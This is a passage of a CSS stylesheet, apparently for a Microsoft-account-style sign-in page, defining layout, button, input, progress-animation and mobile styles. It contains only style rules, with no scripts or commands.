            padding: 11px 12px 12px 12px
        }

        body.cb .msa-helpCell {
            margin-bottom: 24px;
            position: relative
        }

        body.cb .msa-helpSVG {
            float: left;
            position: absolute
        }

        body.cb .msa-helpCellDiv {
            overflow: hidden;
            margin-left: 44px
        }

        body.cb #learnMoreLink,
        body.cb #signup,
        body.cb #idA_MSAccLearnMore {
            white-space: nowrap
        }

        body.cb .modalDialogContent {
            width: 100%;
            position: relative;
            margin: 0 auto
        }

        body.cb .img-centipede {
            width: 100%;
            max-width: 266px;
            height: auto
        }

        body.cb .align-center {
            margin-left: auto;
            margin-right: auto;
            display: inline-block
        }

        body.cb #icdHIP table {
            width: 100% !important
        }

        body.cb input.hip {
            width: 100% !important;
            padding: 4px 8px !important;
            margin-top: 12px !important
        }

        body.cb tr#wlspispHIPErrorContainer>td {
            width: 100% !important
        }

        body.cb .hip-erroricon {
            display: none !important
        }

        .no-margin-top {
            margin-top: 0
        }

        .no-margin-bottom {
            margin-bottom: 0
        }

        .no-padding-left-right {
            padding-left: 0;
            padding-right: 0
        }

        .display-block {
            display: block
        }

        .display-inline-block {
            display: inline-block;
            white-space: nowrap
        }

        @media (max-width:319px) {
            body.cb #ftr {
                margin-top: 60px
            }
        }

        @media (min-height:800px) {
            body.cb #ftr {
                margin-top: 60px
            }
        }

        @media (max-height:400px) {
            body.cb .modalDialogContainer {
                top: 0;
                max-height: 100%
            }
        }

        .progress {
            overflow: hidden
        }

        .progress>div {
            position: absolute;
            height: 5px;
            width: 5px;
            background-color: #0067b8;
            z-index: 100;
            border-radius: 50%;
            opacity: 0
        }

        .progress>img {
            position: absolute
        }

        .progress-container {
            width: 100%;
            position: relative;
            margin-top: 48px;
            margin-bottom: 24px;
            outline-color: transparent
        }

        .progress-container-tile {
            width: 100%;
            position: relative;
            top: 1px
        }

        .progress-container-tile-content {
            width: 100%;
            position: relative;
            top: 15px
        }

        .progress {
            position: absolute;
            top: 0;
            left: 0;
            height: 5px;
            width: 100%
        }

        @keyframes pulse {
            from {
                opacity: .4
            }
        }

        @-o-keyframes pulse {
            from {
                opacity: .4
            }
        }

        @-moz-keyframes pulse {
            from {
                opacity: .4
            }
        }

        @-webkit-keyframes pulse {
            from {
                opacity: .4
            }
        }

        .animate-pulse {
            -webkit-animation: pulse 1s infinite alternate;
            -moz-animation: pulse 1s infinite alternate;
            -o-animation: pulse 1s infinite alternate;
            animation: pulse 1s infinite alternate
        }

        .row.tile:focus .progress>div,
        .row.tile:focus:hover .progress>div,
        .row.tile:active .progress>div {
            background-color: #fff
        }

        .progress>div {
            -webkit-animation: progressDot 2s infinite;
            -moz-animation: progressDot 2s infinite;
            -o-animation: progressDot 2s infinite;
            animation: progressDot 2s infinite
        }

        .progress>div:nth-child(1) {
            -webkit-animation-delay: .05s;
            -moz-animation-delay: .05s;
            -o-animation-delay: .05s;
            animation-delay: .05s
        }

        .progress>div:nth-child(2) {
            -webkit-animation-delay: .2s;
            -moz-animation-delay: .2s;
            -o-animation-delay: .2s;
            animation-delay: .2s
        }

        .progress>div:nth-child(3) {
            -webkit-animation-delay: .35s;
            -moz-animation-delay: .35s;
            -o-animation-delay: .35s;
            animation-delay: .35s
        }

        .progress>div:nth-child(4) {
            -webkit-animation-delay: .5s;
            -moz-animation-delay: .5s;
            -o-animation-delay: .5s;
            animation-delay: .5s
        }

        .progress>div:nth-child(5) {
            -webkit-animation-delay: .65s;
            -moz-animation-delay: .65s;
            -o-animation-delay: .65s;
            animation-delay: .65s
        }

        @-webkit-keyframes progressDot {

            0%,
            20% {
                left: 0;
                -webkit-animation-timing-function: ease-out;
                opacity: 0
            }

            25% {
                opacity: 1
            }

            35% {
                left: 45%;
                -webkit-animation-timing-function: linear
            }

            65% {
                left: 60%;
                -webkit-animation-timing-function: ease-in
            }

            75% {
                opacity: 1
            }

            80%,
            100% {
                left: 100%;
                opacity: 0
            }
        }

        @-moz-keyframes progressDot {

            0%,
            20% {
                left: 0;
                -moz-animation-timing-function: ease-out;
                opacity: 0
            }

            25% {
                opacity: 1
            }

            35% {
                left: 45%;
                -moz-animation-timing-function: linear
            }

            65% {
                left: 60%;
                -moz-animation-timing-function: ease-in
            }

            75% {
                opacity: 1
            }

            80%,
            100% {
                left: 100%;
                opacity: 0
            }
        }

        @-o-keyframes progressDot {

            0%,
            20% {
                left: 0;
                -o-animation-timing-function: ease-out;
                opacity: 0
            }

            25% {
                opacity: 1
            }

            35% {
                left: 45%;
                -o-animation-timing-function: linear
            }

            65% {
                left: 60%;
                -o-animation-timing-function: ease-in
            }

            75% {
                opacity: 1
            }

            80%,
            100% {
                left: 100%;
                opacity: 0
            }
        }

        @keyframes progressDot {

            0%,
            20% {
                left: 0;
                animation-timing-function: ease-out;
                opacity: 0
            }

            25% {
                opacity: 1
            }

            35% {
                left: 45%;
                animation-timing-function: linear
            }

            65% {
                left: 60%;
                animation-timing-function: ease-in
            }

            75% {
                opacity: 1
            }

            80%,
            100% {
                left: 100%;
                opacity: 0
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-o-keyframes fadeIn {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-moz-keyframes fadeIn {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeIn {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        div.links a {
            margin-left: 16px;
            margin-right: 16px
        }

        div.links a.first {
            padding-left: 0
        }

        body.cb {
            color: #1b1b1b;
            text-align: left
        }

        .fadeIn {
            -webkit-animation: fadeIn 1s;
            -moz-animation: fadeIn 1s;
            -o-animation: fadeIn 1s;
            animation: fadeIn 1s
        }

        .backgroundImage,
        .background-image {
            -webkit-animation: fadeIn 1s;
            -moz-animation: fadeIn 1s;
            -o-animation: fadeIn 1s;
            animation: fadeIn 1s
        }

        .background-logo {
            max-width: 256px;
            max-height: 36px;
            display: block;
            margin-left: auto;
            margin-right: auto;
            -webkit-animation: fadeIn 1s;
            -moz-animation: fadeIn 1s;
            -o-animation: fadeIn 1s;
            animation: fadeIn 1s
        }

        .background-logo-holder {
            height: 36px;
            margin-bottom: 24px
        }

        .background,
        .background-image-holder {
            background: #f2f2f2
        }

        .background,
        .background>div,
        .background-image-holder,
        .background-image,
        .background-image-small {
            position: fixed;
            top: 0;
            width: 100%;
            height: 100%
        }

        .background>div,
        .background-image,
        .background-image-small {
            background-repeat: no-repeat, no-repeat;
            background-position: center center, center center;
            background-size: cover, cover
        }

        .background-overlay {
            background: rgba(0, 0, 0, 0.55);
            filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr='#8C000000', endColorstr='#8C000000');
            position: fixed;
            top: 0;
            width: 100%;
            height: 100%
        }

        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            overflow: visible;
            z-index: 99;
            clear: both;
            background-color: rgba(0, 0, 0, 0.6);
            filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr='#99000000', endColorstr='#99000000')
        }

        .footer.default-background-image {
            background: transparent
        }

        .footer.default-background-image div.footerNode a,
        .footer.default-background-image div.footerNode span {
            color: #000
        }

        .outer {
            display: table;
            position: absolute;
            height: 100%;
            width: 100%
        }

        .top {
            display: table-cell;
            vertical-align: top
        }

        .middle {
            display: table-cell;
            vertical-align: middle
        }

        .bottom {
            display: table-cell;
            vertical-align: bottom
        }

        .debug-details-banner {
            width: calc(100% - 40px);
            padding: 44px;
            margin-bottom: 28px;
            position: relative;
            margin-left: auto;
            margin-right: auto;
            color: #1b1b1b;
            background-color: #fff;
            padding: 24px 44px;
            font-size: 13px;
            max-width: 440px;
            min-width: 320px;
            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2)
        }

        .debug-details-banner .table-cell:first-child {
            width: 100%
        }

        .debug-details-banner .override-ltr {
            text-align: left
        }

        .debug-details-banner .header {
            font-size: 15px
        }

        .debug-details-banner .debug-details-header {
            margin-bottom: 10px
        }

        .debug-details-banner .debug-trace-section {
            margin-top: 10px
        }

        .debug-details-banner .debug-details-notification {
            margin-left: 5px;
            color: #107c10
        }

        .inner,
        .sign-in-box {
            margin-left: auto;
            margin-right: auto;
            position: relative;
            max-width: 440px;
            width: calc(100% - 40px);
            padding: 44px;
            margin-bottom: 28px;
            background-color: #fff;
            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            min-width: 320px;
            min-height: 338px;
            overflow: hidden
        }

        .inner.transparent-lightbox,
        .sign-in-box.transparent-lightbox {
            background-color: rgba(255, 255, 255, 0.65)
        }

        .inner.has-popup,
        .sign-in-box.has-popup {
            margin-bottom: 20px
        }

        a:hover {
            text-decoration: underline
        }

        .promoted-fed-cred-box {
            margin-left: auto;
            margin-right: auto;
            position: relative;
            max-width: 440px;
            width: calc(100% - 40px);
            padding: 44px;
            margin-bottom: 28px;
            line-height: 16px;
            min-width: 320px;
            padding: 0
        }

        .promoted-fed-cred-box>* {
            word-wrap: break-word
        }

        .promoted-fed-cred-content {
            background-color: #fff;
            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            padding-left: 44px;
            padding-right: 44px
        }

        .promoted-fed-cred-content.transparent-lightbox {
            background-color: rgba(255, 255, 255, 0.65)
        }

        .promoted-fed-cred-content .row.tile .table {
            padding-top: 8px;
            padding-bottom: 8px
        }

        .new-session-popup-v2sso {
            margin-left: auto;
            margin-right: auto;
            position: relative;
            max-width: 440px;
            width: calc(100% - 40px);
            padding: 44px;
            margin-bottom: 28px;
            background-color: #fff;
            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            line-height: 16px;
            min-width: 320px;
            padding-top: 24px;
            padding-bottom: 24px
        }

        .new-session-popup-v2sso.transparent-lightbox {
            background-color: rgba(255, 255, 255, 0.65)
        }

        .new-session-popup-v2sso>* {
            word-wrap: break-word
        }

        .wide {
            max-width: 640px
        }

        pre {
            font-family: inherit
        }

        .pre-wrap-format {
            white-space: pre-wrap;
            word-wrap: break-word;
            overflow-x: hidden
        }

        .text-input,
        input[type="color"],
        input[type="date"],
        input[type="datetime"],
        input[type="datetime-local"],
        input[type="email"],
        input[type="month"],
        input[type="number"],
        input[type="password"],
        input[type="search"],
        input[type="tel"],
        input[type="text"],
        input[type="time"],
        input[type="url"],
        input[type="week"],
        textarea,
        select {
            padding: 6px 10px;
            border-width: 1px;
            border-color: #666;
            border-color: rgba(0, 0, 0, 0.6);
            height: 36px;
            outline: none;
            border-radius: 0;
            -webkit-border-radius: 0;
            background-color: transparent
        }

        .text-input-hover,
        input[type="color"]:hover,
        input[type="date"]:hover,
        input[type="datetime"]:hover,
        input[type="datetime-local"]:hover,
        input[type="email"]:hover,
        input[type="month"]:hover,
        input[type="number"]:hover,
        input[type="password"]:hover,
        input[type="search"]:hover,
        input[type="tel"]:hover,
        input[type="text"]:hover,
        input[type="time"]:hover,
        input[type="url"]:hover,
        input[type="week"]:hover,
        textarea:hover,
        select:hover {
            border-color: #323232;
            border-color: rgba(0, 0, 0, 0.8)
        }

        .text-input-focus,
        input[type="color"]:focus,
        input[type="date"]:focus,
        input[type="datetime"]:focus,
        input[type="datetime-local"]:focus,
        input[type="email"]:focus,
        input[type="month"]:focus,
        input[type="number"]:focus,
        input[type="password"]:focus,
        input[type="search"]:focus,
        input[type="tel"]:focus,
        input[type="text"]:focus,
        input[type="time"]:focus,
        input[type="url"]:focus,
        input[type="week"]:focus,
        textarea:focus,
        select:focus {
            border-color: #0067b8;
            background-color: transparent
        }

        .text-input-has-error-focus,
        input[type="color"].has-error:focus,
        input[type="date"].has-error:focus,
        input[type="datetime"].has-error:focus,
        input[type="datetime-local"].has-error:focus,
        input[type="email"].has-error:focus,
        input[type="month"].has-error:focus,
        input[type="number"].has-error:focus,
        input[type="password"].has-error:focus,
        input[type="search"].has-error:focus,
        input[type="tel"].has-error:focus,
        input[type="text"].has-error:focus,
        input[type="time"].has-error:focus,
        input[type="url"].has-error:focus,
        input[type="week"].has-error:focus,
        textarea.has-error:focus,
        select.has-error:focus {
            border-color: #e81123
        }

        body.cb div.placeholder {
            margin-top: 8px;
            margin-left: 0
        }

        .btn,
        button,
        input[type='button'],
        input[type='submit'],
        input[type='reset'] {
            min-height: 32px;
            border: none;
            background-color: #ccc;
            background-color: rgba(0, 0, 0, 0.2);
            min-width: 108px;
            line-height: normal
        }

        .btn-hover,
        .btn:hover,
        button:hover,
        input[type="button"]:hover,
        input[type="submit"]:hover,
        input[type="reset"]:hover {
            background-color: #b2b2b2;
            background-color: rgba(0, 0, 0, 0.3)
        }

        .btn-focus,
        .btn:focus,
        button:focus,
        input[type="button"]:focus,
        input[type="submit"]:focus,
        input[type="reset"]:focus {
            background-color: #b2b2b2;
            background-color: rgba(0, 0, 0, 0.3);
            text-decoration: underline;
            outline: 2px solid #000
        }

        .btn.btn-primary,
        button.btn-primary,
        input[type="button"].btn-primary,
        input[type="submit"].btn-primary,
        input[type="reset"].btn-primary {
            border-color: #0067b8;
            background-color: #0067b8
        }

        .btn.btn-primary-hover,
        .btn.btn-primary:hover,
        button.btn-primary:hover,
        input[type="button"].btn-primary:hover,
        input[type="submit"].btn-primary:hover,
        input[type="reset"].btn-primary:hover {
            background-color: #005da6
        }

        .btn.btn-primary-focus,
        .btn.btn-primary:focus,
        button.btn-primary:focus,
        input[type="button"].btn-primary:focus,
        input[type="submit"].btn-primary:focus,
        input[type="reset"].btn-primary:focus {
            background-color: #005da6;
            text-decoration: underline;
            outline: 2px solid #000
        }

        .btn-active,
        .btn:active,
        button:active,
        input[type="button"]:active,
        input[type="submit"]:active,
        input[type="reset"]:active,
        .btn.btn-primary-active,
        .btn.btn-primary:active,
        button.btn-primary:active,
        input[type="button"].btn-primary:active,
        input[type="submit"].btn-primary:active,
        input[type="reset"].btn-primary:active {
            outline: none;
            text-decoration: none;
            -ms-transform: scale(.98);
            -webkit-transform: scale(.98);
            transform: scale(.98)
        }

        .button.secondary {
            display: inline-block;
            min-width: 100px;
            padding: 4px 12px 4px 12px;
            margin-top: 4px;
            margin-bottom: 4px;
            position: relative;
            max-width: 100%;
            text-align: center;
            white-space: nowrap;
            overflow: hidden;
            vertical-align: middle;
            text-overflow: ellipsis;
            touch-action: manipulation;
            color: #000;
            border-style: solid;
            border-width: 2px;
            border-color: transparent;
            min-height: 32px;
            border: none;
            background-color: #ccc;
            background-color: rgba(0, 0, 0, 0.2);
            min-width: 108px;
            line-height: normal;
            margin-top: 0;
            margin-bottom: 0;
            display: block;
            width: 100%
        }

        .button.secondary:hover {
            background-color: #b2b2b2;
            background-color: rgba(0, 0, 0, 0.3)
        }

        .button.secondary:focus {
            background-color: #b2b2b2;
            background-color: rgba(0, 0, 0, 0.3);
            text-decoration: underline;
            outline: 2px solid #000
        }

        .button.secondary:active {
            outline: none;
            text-decoration: none;
            -ms-transform: scale(.98);
            -webkit-transform: scale(.98);
            transform: scale(.98)
        }

        .button.primary {
            color: #fff;
            border-color: #0067b8;
            background-color: #0067b8;
            display: block;
            width: 100%
        }

        .button.primary:hover {
            background-color: #005da6
        }

        .button.primary:focus {
            background-color: #005da6;
            text-decoration: underline;
            outline: 2px solid #000
        }

        .button.primary:active {
            outline: none;
            text-decoration: none;
            -ms-transform: scale(.98);
            -webkit-transform: scale(.98);
            transform: scale(.98)
        }

        .logo {
            max-width: 256px;
            height: 24px
        }

        .identityBanner {
            height: 24px;
            background: #fff;
            margin-top: 16px;
            margin-bottom: -4px
        }

        .identity {
            line-height: 24px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis
        }

        .backButton {
            min-height: 24px;
            width: 24px;
            min-width: 24px;
            float: left;
            padding: 0;
            background-color: #fff;
            border-width: 0;
            border-radius: 12px;
            margin-right: 2px
        }

        .backButton:hover {
            background-color: #e6e6e6;
            background-color: rgba(0, 0, 0, 0.1)
        }

        .backButton:hover:focus {
            background-color: #ccc;
            background-color: rgba(0, 0, 0, 0.2)
        }

        .backButton:active {
            background-color: #b3b3b3;
            background-color: rgba(0, 0, 0, 0.3)
        }

        .backButton:focus {
            background-color: #e6e6e6;
            background-color: rgba(0, 0, 0, 0.1);
            outline: none
        }

        .boilerplate-text {
            background-color: #f2f2f2;
            padding: 24px 44px 36px 44px;
            margin: 76px -44px -44px -44px
        }

        .boilerplate-text.transparent-lightbox {
            background-color: rgba(242, 242, 242, 0.2)
        }

        .boilerplate-text>p:first-child {
            margin-top: 0
        }

        .boilerplate-text>p:last-child {
            margin-bottom: 0
        }

        .tile-container,
        .relative {
            position: relative
        }

        .table {
            width: 100%;
            display: table;
            table-layout: fixed
        }

        .table .table-row {
            display: table-row
        }

        .table .table-cell {
            display: table-cell;
            vertical-align: middle
        }

        .row {
            margin-left: 0;
            margin-right: 0
        }

        .row.tile {
            margin-bottom: 0;
            outline: none;
            color: inherit;
            display: block;
            margin-left: -44px;
            margin-right: -44px
        }

        .row.tile:not(.no-pick) {
            cursor: pointer
        }

        .row.tile:not(.no-pick):hover {
            background-color: #e6e6e6;
            background-color: rgba(0, 0, 0, 0.1);
            color: inherit
        }

        .row.tile:not(.no-pick):active {
            background-color: #b3b3b3;
            background-color: rgba(0, 0, 0, 0.3);
            color: inherit
        }

        .row.tile .content {
            line-height: 16px;
            padding-left: 12px;
            padding-right: 12px
        }

        .row.tile .content>* {
            word-wrap: break-word
        }

        .row.tile .tile-menu {
            width: 23px
        }

        .row.tile .table {
            padding: 12px 44px
        }

        .row.tile .table:focus {
            outline: #000 dashed 1px;
            background: #ccc;
            background: rgba(0, 0, 0, 0.1)
        }

        .row.tile .table[role=listitem] {
            display: table;
            margin-left: 0
        }

        .row.tile .table-cell:first-child+.table-cell {
            width: 100%
        }

        .tile-img {
            position: relative;
            width: 48px;
            height: 48px
        }

        .tile-img.medium {
            width: 32px;
            height: 32px
        }

        .tile-img.small {
            width: 24px;
            height: 24px;
            float: left;
            margin-right: 8px
        }

        .tile-img .tile-badge {
            position: absolute;
            right: 0;
            bottom: 0
        }

        div.footerNode {
            margin: 0;
            float: right
        }

        div.footerNode a,
        div.footerNode span {
            color: #fff;
            font-size: 12px;
            line-height: 28px;
            white-space: nowrap;
            display: inline-block;
            margin-left: 8px;
            margin-right: 8px
        }

        h3,
        .text-body,
        p {
            padding: 0;
            margin-top: 16px;
            margin-bottom: 12px
        }

        .form-group {
            margin-bottom: 16px
        }

        .form-group label {
            margin-top: 0;
            margin-bottom: 0
        }

        .btn,
        button,
        input[type='button'],
        input[type='submit'],
        input[type='reset'] {
            margin-top: 0;
            margin-bottom: 0
        }

        .col-xs-12.secondary {
            padding-right: 4px
        }

        .col-xs-12.primary {
            padding-left: 4px
        }

        .no-margin {
            margin: 0
        }

        .no-margin-bottom {
            margin-bottom: 0
        }

        .no-margin-top-bottom {
            margin-top: 0;
            margin-bottom: 0
        }

        .no-padding-top-bottom {
            padding-top: 0;
            padding-bottom: 0
        }

        .overflow-hidden {
            overflow: hidden
        }

        .menu-dots {
            padding: 24px 0;
            position: absolute;
            right: 0;
            top: 2px
        }

        .menu-dots>div {
            padding: 0 5px
        }

        .menu-dots>div:focus {
            outline: #000 dashed 1px;
            background: none
        }

        .menu {
            position: absolute;
            background-color: #fff;
            border: 1px solid #e6e6e6;
            border: 1px solid rgba(0, 0, 0, 0.1);
            background-clip: padding-box;
            z-index: 2;
            top: 0;
            right: 10px;
            width: 160px
        }

        .menu li {
            margin: 0
        }

        .menu li a {
            display: block;
            padding: 11px 12px 13px;
            background-color: #f2f2f2;
            background-color: rgba(0, 0, 0, 0.05);
            outline: none;
            color: inherit;
            cursor: pointer
        }

        .menu li a:focus {
            outline: #000 dashed 1px;
            background-color: #e6e6e6;
            background-color: rgba(0, 0, 0, 0.1)
        }

        .menu li a:hover {
            background-color: #e6e6e6;
            background-color: rgba(0, 0, 0, 0.1)
        }

        .menu li a:active {
            background-color: #b3b3b3;
            background-color: rgba(0, 0, 0, 0.3)
        }

        .moveOffScreen {
            position: fixed;
            bottom: 0;
            right: 0;
            height: 0 !important;
            width: 0 !important;
            overflow: hidden;
            opacity: 0;
            filter: alpha(opacity=0)
        }

        .largePadding {
            padding: 40px
        }

        .displaySign {
            text-align: center;
            font-size: 2.5rem;
            margin-top: 16px;
            margin-bottom: 16px
        }

        .banner-logo {
            max-height: 36px
        }

        .dialog-outer {
            display: table;
            position: absolute;
            height: 100%;
            width: 100%;
            z-index: 100;
            background: rgba(0, 0, 0, 0.55);
            filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr='#8C000000', endColorstr='#8C000000')
        }

        .dialog-outer .dialog-middle {
            display: table-cell;
            vertical-align: middle
        }

        .dialog-outer .dialog-middle .dialog-inner {
            position: relative;
            margin-left: auto;
            margin-right: auto;
            padding: 28px;
            max-width: 562px;
            background-color: #fff;
            border: 2px #4f74b2 solid;
            z-index: 100
        }

        .dialog-outer .dialog-middle .dialog-inner .dialog-content {
            position: relative
        }

        .dialog-outer .dialog-middle .dialog-inner .dialog-content .text-title {
            font-size: 18px;
            font-weight: 400;
            padding: 0;
            margin-top: 0;
            margin-bottom: 12px
        }

        .appInfoPopOver {
            position: absolute;
            font-size: 13px;
            margin-left: auto;
            margin-right: auto;
            left: 0;
            right: 0;
            width: 404px;
            padding: 22px;
            border: 2px solid #e6e6e6;
            background-color: #fff;
            z-index: 100;
            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2)
        }

        .appInfoPopOver .title {
            font-weight: 600;
            font-weight: bold;
            font-size: 16px
        }

        .appInfoPopOver .table {
            display: inline-grid;
            max-height: 160px;
            max-width: 95%;
            margin-top: 8px;
            float: right;
            overflow-y: auto
        }

        .appInfoPopOver .table .row {
            display: table-row;
            padding-top: 8px;
            word-break: break-all
        }

        .appInfoPopOver .table .label {
            font-weight: 600;
            font-weight: bold
        }

        .appInfoPopOver .button {
            float: right;
            padding-right: 2px;
            padding-left: 2px
        }

        .appInfoVerifiedPublisherStatus {
            color: #0067b8
        }

        .moreOptions .mobileMode {
            display: none
        }

        .no-outline {
            outline: none
        }

        .no-wrap {
            white-space: nowrap
        }

        .form-group-last-child {
            margin-bottom: 20px
        }

        .position-buttons>div:first-child {
            display: inline-block;
            width: 100%;
            margin-bottom: 36px
        }

        ul {
            margin: 0
        }

        .scope {
            margin-bottom: 8px;
            margin-top: 8px
        }

        .scope .text-caption {
            margin: 8px 0 0 28px
        }

        .scope .toggle {
            cursor: pointer
        }

        .scope .toggle .chevron {
            width: 20px;
            float: left
        }

        .scope .toggle .label {
            margin: 0;
            margin-left: 8px
        }

        .button-container {
            position: absolute;
            bottom: 0;
            right: 0;
            text-align: right
        }

        .agreement-buttons div.button-container {
            position: relative;
            bottom: auto;
            right: auto;
            text-align: right
        }

        .move-buttons div.button-container {
            bottom: auto
        }

        .help-button {
            cursor: pointer
        }

        @media (max-width:600px),
        (max-height:366px) {

            .background,
            .background>div,
            .background-image-holder,
            .background-image,
            .background-image-small {
                display: none
            }

            .background.app,
            .background.app>div,
            .background-image-holder.app,
            .background-image-holder.app .background-image,
            .background-image-holder.app .background-image-small {
                display: inherit
            }

            .background-logo-holder {
                margin-top: 24px
            }

            .middle,
            .bottom {
                vertical-align: top
            }

            .middle.app,
            .bottom.app {
                padding-left: 8px;
                padding-right: 8px
            }

            .inner,
            .sign-in-box {
                padding: 24px;
                margin-top: 0;
                margin-bottom: 68px;
                width: 100%;
                width: 100vw;
                -webkit-box-shadow: none;
                -moz-box-shadow: none;
                box-shadow: none;
                border: 0
            }

            .inner.app,
            .sign-in-box.app {
                min-width: 304px;
                width: calc(100vw - 16px)
            }

            .inner.app,
            .sign-in-box.app {
                -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                border: 1px solid #818c94;
                border: 1px solid rgba(0, 0, 0, 0.4)
            }

            .inner.has-popup,
            .sign-in-box.has-popup {
                padding-bottom: 0;
                margin-bottom: 0
            }

            .inner.has-popup.app,
            .sign-in-box.has-popup.app {
                padding-bottom: 24px;
                margin-bottom: 20px
            }

            .promoted-fed-cred-box {
                padding: 24px;
                margin-top: 0;
                margin-bottom: 68px;
                width: 100%;
                width: 100vw;
                padding: 0 24px
            }

            .promoted-fed-cred-box.app {
                min-width: 304px;
                width: calc(100vw - 16px)
            }

            .promoted-fed-cred-box.app {
                padding: 0
            }

            .promoted-fed-cred-content {
                -webkit-box-shadow: none;
                -moz-box-shadow: none;
                box-shadow: none;
                border: 0;
                padding-left: 24px;
                padding-right: 24px;
                border: 1px solid #818c94;
                border: 1px solid rgba(0, 0, 0, 0.4)
            }

            .promoted-fed-cred-content.app {
                -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                border: 1px solid #818c94;
                border: 1px solid rgba(0, 0, 0, 0.4)
            }

            .row.tile {
                margin-left: -24px;
                margin-right: -24px
            }

            .row.tile .table {
                padding: 12px 24px
            }

            .wide {
                max-width: 440px
            }

            .footer {
                position: absolute;
                margin-bottom: -24px;
                left: 0
            }

            .footer.default {
                background: #fff;
                margin-bottom: 0
            }

            .footer.default div.footerNode a,
            .footer.default div.footerNode span {
                color: #747474
            }

            .footer:lang(ru-ru),
            .footer:lang(uk-ua) {
                position: relative
            }

            div.footerNode {
                float: left;
                margin: 0 24px !important
            }

            .boilerplate-text {
                padding: 20px;
                margin-top: 56px;
                margin-right: 0;
                margin-bottom: 0;
                margin-left: 0
            }

            .debug-details-banner {
                background-color: #f2f2f2;
                padding: 24px;
                -webkit-box-shadow: none;
                -moz-box-shadow: none;
                box-shadow: none
            }

            .appInfoPopOver {
                margin-left: auto;
                margin-right: auto;
                left: 0;
                right: 0;
                width: 360px;
                background-color: #fff;
                -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2)
            }

            .appInfoPopOver .table {
                max-height: 122px
            }

            .moreOptions .mobileMode {
                display: inline-block
            }

            .moreOptions .desktopMode {
                display: none
            }

            .footerSignout,
            .footerSignout>a {
                color: #262626 !important
            }

            .move-buttons div.button-container {
                bottom: auto
            }
        }

        .page-description-with-icon {
            margin-left: 34px
        }

        .bold {
            font-weight: bold
        }

        .stack-trace {
            color: black;
            font-family: "Consolas", monospace;
            overflow: auto
        }

        .stack-trace p {
            margin-top: 15px
        }

        .stack-trace ul {
            list-style: none
        }

        .stack-trace ul li {
            margin-top: 15px
        }

        .stack-trace fieldset {
            color: black;
            border: 0;
            border-top: 1px solid white;
            margin-bottom: 50px
        }

        .stack-trace hr {
            border: none;
            border-top: solid 1px white
        }

        .linked-in-consent {
            position: relative
        }

        .linked-in-consent img {
            width: 100%
        }

        .linked-in-consent .display-name {
            width: 100%;
            text-align: center;
            bottom: 10px;
            font-weight: 600;
            position: absolute
        }

        .inline-block {
            display: inline-block
        }

        .text-input,
        input[type="color"],
        input[type="date"],
        input[type="datetime"],
        input[type="datetime-local"],
        input[type="email"],
        input[type="month"],
        input[type="number"],
        input[type="password"],
        input[type="search"],
        input[type="tel"],
        input[type="text"],
        input[type="time"],
        input[type="url"],
        input[type="week"],
        textarea {
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0;
            padding-left: 0
        }

        .input.text-box {
            padding: 4px 8px;
            border-style: solid;
            border-width: 2px;
            border-color: rgba(0, 0, 0, 0.4);
            background-color: rgba(255, 255, 255, 0.4);
            height: 32px;
            height: 2rem;
            padding: 6px 10px;
            border-width: 1px;
            border-color: #666;
            border-color: rgba(0, 0, 0, 0.6);
            height: 36px;
            outline: none;
            border-radius: 0;
            -webkit-border-radius: 0;
            background-color: transparent;
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0;
            padding-left: 0
        }

        .input.text-box:focus {
            background-color: #fff;
            border-color: #0067b8;
            background-color: transparent
        }

        .input.text-box:hover {
            border-color: #323232;
            border-color: rgba(0, 0, 0, 0.8)
        }

        .input.text-box::-moz-placeholder {
            color: rgba(0, 0, 0, 0.6);
            opacity: 1
        }

        .input.text-box:-ms-input-placeholder {
            color: rgba(0, 0, 0, 0.6)
        }

        .input.text-box::-webkit-input-placeholder {
            color: rgba(0, 0, 0, 0.6)
        }

        .input.text-box.has-error {
            border-color: #e81123
        }

        .input.text-box.has-error:focus {
            border-color: #e81123
        }

        [disabled].input.text-box,
        [readonly].input.text-box,
        fieldset[disabled] .input.text-box {
            border-color: #ccc !important;
            background-color: rgba(0, 0, 0, 0.2) !important;
            color: rgba(0, 0, 0, 0.2) !important
        }

        body.cb input[type="text"].hip {
            border-width: 0 !important;
            border-bottom-width: 1px !important;
            padding: 6px 0 !important
        }

        textarea.brickwall {
            height: 42px;
            width: 100%;
            resize: vertical
        }

